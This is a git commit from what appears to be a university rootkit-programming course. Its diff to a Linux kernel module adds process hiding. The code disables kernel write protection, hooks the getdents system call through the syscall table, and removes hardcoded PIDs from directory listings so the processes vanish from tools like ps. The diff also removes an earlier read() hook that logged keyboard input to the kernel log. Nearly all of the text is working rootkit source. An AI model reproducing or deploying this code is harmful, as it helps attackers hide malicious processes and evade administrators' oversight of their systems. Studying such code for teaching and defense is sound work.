5feae1a3d715dba0ca08af87ffb075df96560734
wenwen <wenwen@debian>
2013-11-03 02:17:32 +0100

    process hiding works

--- mod.c
+++ mod.c
@@ -11,90 +11,145 @@
 #include <linux/kernel.h> /* Needed for KERN_INFO */
 #include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
 #include <linux/sched.h>
-#include "sysmap.h"
 #include <asm/page.h>
 #include <asm/pgtable.h>
 #include <asm/unistd.h>
 #include <asm/processor-flags.h>
-#include <linux/string.h>
-#include <linux/slab.h>
+#include <linux/types.h>
+#include "sysmap.h"
 
-#define DRIVER_AUTHOR "Rootkit Programming"
-#define DRIVER_DESC   "Assigment 1 - 5 LKM Programming"
+#define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
+#define DRIVER_DESC   "Assigment 3 Process Hiding"
 
+static int myPIDArray[2] = {2442, 4840};
+static int myPIDArrayLen = 2;
+/* Structure directory entries */
+struct linux_dirent {
+               unsigned long  d_ino;     /* Inode number */
+               unsigned long  d_off;     /* Offset to next linux_dirent */
+               unsigned short d_reclen;  /* Length of this linux_dirent */
+               char           d_name[];  /* Filename (null-terminated) */
+           };
+void ** syscall_table = (void * *) sys_call_table_R;
+long (*orig_sys_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
+int r_count=0;
 
-// cast sys_call_table
-unsigned long *sys_call_table = (unsigned long *) sys_call_table_R;
+inline void disable_wp(void){
+	write_cr0(read_cr0() & ~0x00010000);
+}
 
-// cast pages function
-void (*pages_rw)(struct page *page, int numpages) =  (void *) set_pages_rw_T;
-void (*pages_ro)(struct page *page, int numpages) =  (void *) set_pages_ro_T;
+inline void enable_wp(void){
+	write_cr0(read_cr0() | 0x00010000);
+}
 
-struct page * sys_call_pages_temp;
-
-char * buffer;
-
-long (*original_read)(unsigned int, char __user *, size_t);
-static long my_read(unsigned int fd, char __user *buf, size_t count){
-  long t =(*original_read)(fd,buf,count);
-
-  if(fd == 0){//stdin
-    printk(KERN_INFO "begin\n");
-    if(count >= 0){
-      kfree(buffer);
-      buffer = (char *) kmalloc(count+1, GFP_KERNEL);
-    }
-    if(buffer != NULL){
-      strncpy(buffer, (char*)buf, count);
-      buffer[count]='\0';
-      printk(KERN_INFO "%s\n", buffer);
-    }
-    printk(KERN_INFO "fertig\n");
+/* convert char array to integer */
+int atoi(char *str){
+  int res = 0;
+  int index = 0;
+  int mul = 1;
+  while(str[index]!='\0'){
+    index ++;
   }
-  return t;
+  index--;
+  while(index>=0){
+    if(str[index]<'0' || str[index]>'9'){
+      return -1;
+    }
+    res += (str[index]-'0')*mul;
+    mul *= 10;
+    index --;
+  }
+  return res;
 }
 
-static void print_nr_procs()
-{
-  // cast system symbol adress to function pointer
-  int a = ((int (*)(void))nr_processes_T)();
-  printk(KERN_INFO "Number of current running processes (cast system symbol adress to function pointer): %d\n", a);
+struct task_struct *get_task(pid_t pid) {
+  struct task_struct *p = get_current(), *entry=NULL;
+  list_for_each_entry(entry,&(p->tasks),tasks){
+    if(entry->pid == pid){
+      //printk("pid found=%d\n",entry->pid);
+      return entry;
+    }else{
+     //printk(KERN_INFO "pid=%d not found: %d\n",pid, entry->pid);
+    }
+  }
+  return NULL;
 }
+
+int find_hide_process(pid_t pid){
+  int index = 0;
+  struct task_struct *task = get_task(pid);
+  if(task){
+    while(index<myPIDArrayLen){
+      if(myPIDArray[index] == pid){
+        printk(KERN_INFO "I'd like to hid process pid=%d\n",pid);
+        return 1;
+        }
+      index++;
+    } 
+    return 0;
+  }else{
+  return 0;
+  }
+}
+
+static long my_sys_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
+  long retVal;
+  unsigned long restLen;
+  unsigned short currLen;
+
+  int debug_count = 1000;
+
+  r_count++;
+  retVal = orig_sys_getdents(fd, dirent, count);
+  printk(KERN_INFO "get dents value %ld\n",retVal);
+  if(retVal > 0){
+    restLen = retVal;
+    while(restLen>0){
+    //while(restLen>0 && debug_count>0){
+      debug_count --;
+      currLen = dirent->d_reclen;
+      // avoid loop to death
+      if(currLen<=0){
+        break;
+      }
+      restLen -= currLen;
+      if(find_hide_process(atoi(dirent->d_name))){
+        memmove(dirent, (char *) dirent + dirent->d_reclen, restLen);
+        retVal -= currLen;
+      }
+      //printk(KERN_INFO "pid=%s\n",dirent->d_name);
+      if(restLen){
+        /* Jump to next entry */
+        dirent = (struct linux_dirent *) ((char *)dirent + dirent->d_reclen);
+      }
+    }
+  }
+  r_count--;
+  return retVal;
+}
+
 
 static int __init mod_init(void)
 {
-  printk(KERN_INFO "Welcome!\n");
-  print_nr_procs();
+  disable_wp(); 
 
-  write_cr0 (read_cr0() & (~ X86_CR0_WP));
-  sys_call_pages_temp = virt_to_page(&sys_call_table);
-  pages_rw(sys_call_pages_temp,1);
-  printk(KERN_INFO "change to read write\n");
-
-  original_read = (void *) sys_call_table[__NR_read];
-  sys_call_table[__NR_read] = (long) my_read;
-  write_cr0 (read_cr0() | X86_CR0_WP);
-  printk(KERN_INFO "Welcome end!\n");
+  orig_sys_getdents = syscall_table[__NR_getdents];
+  syscall_table[__NR_getdents] = my_sys_getdents;
+ 
+  enable_wp();
+  
+  printk(KERN_INFO "Process Hiding Module loaded.\n");
   return 0;
 }
 
 static void __exit mod_exit(void)
 {
-  printk(KERN_INFO "1\n");
-  write_cr0 (read_cr0() & (~ X86_CR0_WP));
-  printk(KERN_INFO "2\n");
-
-  sys_call_table[__NR_read] = (long) original_read;
-  printk(KERN_INFO "3\n");
-
-  sys_call_pages_temp = virt_to_page(sys_call_table);
-  printk(KERN_INFO "4\n");
-  pages_ro(sys_call_pages_temp,1);
-  printk(KERN_INFO "change to read only\n");
-  write_cr0 (read_cr0() | X86_CR0_WP);
-  printk(KERN_INFO "5\n");
-  kfree(buffer);
-  printk(KERN_INFO "Goodbye!\n");
+  disable_wp();
+  syscall_table[__NR_getdents] = orig_sys_getdents;
+  enable_wp();
+  while(r_count > 0){ //hack to unblock read
+	printk(KERN_INFO "\n");
+  }  
 }
 
 
@@ -105,3 +160,4 @@ module_exit(mod_exit);
 MODULE_AUTHOR(DRIVER_AUTHOR);
 MODULE_DESCRIPTION(DRIVER_DESC);
 MODULE_LICENSE("GPL");
+
